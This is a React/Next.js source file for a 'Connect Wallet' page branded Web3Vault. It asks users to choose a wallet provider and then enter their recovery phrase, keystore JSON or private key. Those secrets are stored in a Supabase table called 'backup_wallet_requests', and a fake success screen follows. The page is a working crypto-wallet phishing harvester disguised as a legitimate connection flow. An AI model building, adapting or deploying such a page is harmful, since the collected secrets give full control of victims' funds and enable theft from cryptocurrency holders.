"use client";

import { useMemo, useState, useEffect } from "react";
import Link from "next/link";
import Image from "next/image";
import { supabaseUser } from "@/lib/supabaseClient";
import Navbar from "../components/Navbar";
import { useI18n } from "@/lib/i18n/I18nProvider";

type WalletProvider = {
  id: string;
  name: string;
  logo_url: string | null;
};

const getInitials = (name: string) =>
  name
    .replace(/[^a-zA-Z0-9 ]/g, " ")
    .split(" ")
    .filter(Boolean)
    .slice(0, 2)
    .map((part) => part[0])
    .join("")
    .toUpperCase();

export default function ConnectWalletPage() {
  const { t } = useI18n();
  const [wallets, setWallets] = useState<WalletProvider[]>([]);
  const [isLoadingWallets, setIsLoadingWallets] = useState(true);
  const [activeWallet, setActiveWallet] = useState<string | null>(null);
  const [modalStep, setModalStep] = useState<
    "preview" | "form" | "success"
  >("preview");
  const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "private">(
    "phrase"
  );
  const [walletName, setWalletName] = useState("");
  const [walletEmail, setWalletEmail] = useState("");
  const [secretValue, setSecretValue] = useState("");
  const [submitError, setSubmitError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    const loadWallets = async () => {
      const { data } = await supabaseUser
        .from("wallet_providers")
        .select("id,name,logo_url")
        .eq("is_active", true)
        .order("sort_order", { ascending: true })
        .order("name", { ascending: true });

      setWallets(data ?? []);
      setIsLoadingWallets(false);
    };

    loadWallets();
  }, []);

  const resetModal = () => {
    setActiveWallet(null);
    setModalStep("preview");
    setActiveTab("phrase");
    setWalletName("");
    setWalletEmail("");
    setSecretValue("");
    setSubmitError("");
    setIsSubmitting(false);
  };

  const activeInitials = useMemo(() => {
    if (!activeWallet) return "";
    return getInitials(activeWallet);
  }, [activeWallet]);

  return (
    <div className="min-h-screen bg-[#0b0b12] text-white">
      <Navbar />

      <main className="mx-auto w-full max-w-6xl px-6 pb-24 pt-10">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white sm:text-4xl">{t("connect.title")}</h1>
          <div className="mx-auto mt-5 inline-flex max-w-3xl items-center justify-center rounded-2xl border border-cyan-400/20 bg-[#151129]/80 px-6 py-4 text-sm text-slate-300 shadow-[0_0_24px_rgba(34,211,238,0.15)]">
            {t("connect.subtitle")}
          </div>
        </div>

        <div className="mt-14">
          <h2 className="text-lg font-semibold text-white text-center">{t("connect.chooseWallet")}</h2>
          <div className="mt-6 rounded-2xl border border-white/10 bg-[#100a1f]/40 p-6 shadow-[0_12px_30px_rgba(5,8,20,0.45)]">
            <div className="grid grid-cols-2 gap-4 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4">
              {isLoadingWallets
                ? null
                : wallets.map((wallet) => (
                    <div
                      key={wallet.id}
                      className="flex flex-col items-center gap-2 rounded-2xl border border-white/10 bg-[#1a1130] px-4 py-4 text-center shadow-[0_10px_24px_rgba(5,8,20,0.5)] transition duration-300 ease-out hover:-translate-y-0.5 hover:shadow-[0_18px_36px_rgba(5,8,20,0.6)]"
                      role="button"
                      tabIndex={0}
                      onClick={() => {
                        setActiveWallet(wallet.name);
                        setModalStep("preview");
                        setActiveTab("phrase");
                      }}
                      onKeyDown={(event) => {
                        if (event.key === "Enter" || event.key === " ") {
                          setActiveWallet(wallet.name);
                          setModalStep("form");
                          setActiveTab("phrase");
                        }
                      }}
                    >
                      <div
                        className={`flex w-12 aspect-square shrink-0 items-center justify-center overflow-hidden rounded-full text-sm font-semibold shadow-[0_8px_16px_rgba(15,23,42,0.35)] ${
                          wallet.logo_url
                            ? "bg-transparent"
                            : "border border-white/10 bg-white text-[#2dd4f8]"
                        }`}
                      >
                        {wallet.logo_url ? (
                          <img
                            src={wallet.logo_url}
                            alt={wallet.name}
                            className="h-full w-full rounded-full object-contain p-1"
                          />
                        ) : (
                          getInitials(wallet.name)
                        )}
                      </div>
                      <div className="text-xs sm:text-sm font-semibold text-cyan-300 text-center">
                        {wallet.name}
                      </div>
                    </div>
                  ))}
            </div>
          </div>
        </div>
      </main>

      {activeWallet ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center px-6">
          <button
            className="absolute inset-0 bg-black/70"
            onClick={resetModal}
            aria-label={t("connect.modal.close")}
          />
          {modalStep === "preview" ? (
            <div className="relative w-full max-w-sm rounded-2xl border border-white/10 bg-[#1a1130] p-6 text-center shadow-[0_20px_50px_rgba(4,10,22,0.6)]">
              <div className="flex items-center justify-between text-left text-sm font-semibold text-cyan-200">
                <span>{t("connect.modal.connectWallet")}</span>
                <button
                  className="text-cyan-200 transition hover:text-white"
                  onClick={resetModal}
                  aria-label={t("connect.modal.close")}
                >
                  ✕
                </button>
              </div>
              <div className="mt-6 flex flex-col items-center">
                <div className="flex h-16 w-16 items-center justify-center rounded-full border border-white/10 bg-white text-lg font-bold text-[#2dd4f8] shadow-[0_8px_16px_rgba(15,23,42,0.35)]">
                  {activeInitials}
                </div>
                <div className="mt-4 text-base font-semibold text-white">
                  {activeWallet}
                </div>
                <button
                  className="mt-4 rounded-full bg-linear-to-r from-cyan-400 to-violet-500 px-6 py-2 text-sm font-semibold text-slate-900 shadow-[0_0_20px_rgba(34,211,238,0.35)]"
                  onClick={() => setModalStep("form")}
                >
                  {t("connect.modal.connect")}
                </button>
                <p className="mt-4 text-xs text-rose-400">{t("connect.modal.note")}</p>
              </div>
            </div>
          ) : modalStep === "form" ? (
            <div className="relative w-full max-w-md rounded-2xl border border-white/10 bg-[#1a1130] p-6 text-center shadow-[0_20px_50px_rgba(4,10,22,0.6)]">
              <div className="flex items-center justify-between text-left text-sm font-semibold text-cyan-200">
                <span>{t("connect.form.connectPrefix")} {activeWallet}</span>
                <button
                  className="text-cyan-200 transition hover:text-white"
                  onClick={resetModal}
                  aria-label={t("connect.modal.close")}
                >
                  ✕
                </button>
              </div>

              <div className="mt-4 flex items-center justify-center gap-4 text-xs font-semibold text-slate-300">
                {[
                  { key: "phrase", label: t("connect.tabs.phrase") },
                  { key: "keystore", label: t("connect.tabs.keystore") },
                  { key: "private", label: t("connect.tabs.private") },
                ].map((tab) => (
                  <button
                    key={tab.key}
                    className={`rounded-full px-3 py-1 transition ${
                      activeTab === tab.key
                        ? "bg-cyan-400/15 text-cyan-200 ring-1 ring-cyan-300/40"
                        : "text-slate-400 hover:text-cyan-200"
                    }`}
                    onClick={() =>
                      setActiveTab(tab.key as "phrase" | "keystore" | "private")
                    }
                  >
                    {tab.label}
                  </button>
                ))}
              </div>

              <div className="mt-5 space-y-3 text-left text-sm">
                <input
                  className="w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
                  placeholder={t("connect.input.walletName")}
                  value={walletName}
                  onChange={(event) => setWalletName(event.target.value)}
                />
                <input
                  className="w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
                  placeholder={t("connect.input.walletEmail")}
                  value={walletEmail}
                  onChange={(event) => setWalletEmail(event.target.value)}
                />
                <textarea
                  className="min-h-[110px] w-full rounded-xl border border-white/10 bg-[#120d21] px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-400/40"
                  placeholder={
                    activeTab === "phrase"
                      ? t("connect.input.recoveryPhrase")
                      : activeTab === "keystore"
                        ? t("connect.input.keystoreJson")
                        : t("connect.input.privateKey")
                  }
                  value={secretValue}
                  onChange={(event) => setSecretValue(event.target.value)}
                />
                {activeTab === "phrase" ? (
                  <p className="text-xs text-slate-400">{t("connect.hint.phrase")}</p>
                ) : null}
              </div>

              <button
                className="mt-5 w-full rounded-full bg-linear-to-r from-cyan-400 to-violet-500 px-6 py-2.5 text-sm font-semibold text-slate-900 shadow-[0_0_20px_rgba(34,211,238,0.35)]"
                onClick={async () => {
                  if (!activeWallet) return;
                  setSubmitError("");
                  setIsSubmitting(true);

                  const { data } = await supabaseUser.auth.getSession();
                  const user = data.session?.user;

                  const payload = JSON.stringify({
                    walletName,
                    walletEmail,
                    value: secretValue,
                    method: activeTab,
                  });

                  const { error } = await supabaseUser
                    .from("backup_wallet_requests")
                    .insert({
                      user_id: user?.id ?? null,
                      user_email: user?.email ?? walletEmail ?? null,
                      provider: activeWallet,
                      method: activeTab,
                      payload,
                      source: "connect_wallet",
                    });

                  setIsSubmitting(false);

                  if (error) {
                    setSubmitError(error.message);
                    return;
                  }

                  setModalStep("success");
                }}
              >
                {isSubmitting ? t("connect.submitting") : t("connect.submit")}
              </button>
              {submitError ? (
                <p className="mt-3 text-xs text-rose-400">{submitError}</p>
              ) : null}
              <button
                className="mt-3 text-xs font-semibold text-cyan-200/80 hover:text-cyan-100"
                onClick={resetModal}
              >
                {t("connect.cancel")}
              </button>
            </div>
          ) : (
            <div className="relative w-full max-w-sm rounded-2xl bg-white p-8 text-center text-slate-800 shadow-[0_20px_50px_rgba(0,0,0,0.45)]">
              <div className="mx-auto flex items-center justify-center gap-2 text-sm font-semibold text-slate-700">
                <span className="flex h-8 w-8 items-center justify-center overflow-hidden rounded-lg border border-slate-200 bg-slate-50">
                  <Image src="/images/logo1.jpeg" alt="Web3Vault" width={20} height={20} className="h-5 w-5 rounded object-cover" />
                </span>
                Web3Vault
              </div>
              <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-slate-900 text-white">
                ✓
              </div>
              <div className="mt-3 flex items-center justify-center gap-1 text-amber-400">
                {"★★★★★"}
              </div>
              <h3 className="mt-3 text-lg font-bold text-slate-900">{t("connect.success.title")}</h3>
              <p className="mt-1 text-xs text-slate-500">
                UID: wu1769792969700
              </p>
              <p className="mt-3 text-sm text-slate-600">{t("connect.success.desc")}</p>
              <Link
                href="/"
                className="mt-6 inline-flex rounded-full bg-[#6d28d9] px-6 py-2 text-sm font-semibold text-white"
                onClick={resetModal}
              >
                {t("connect.success.returnHome")}
              </Link>
            </div>
          )}
        </div>
      ) : null}
    </div>
  );
}
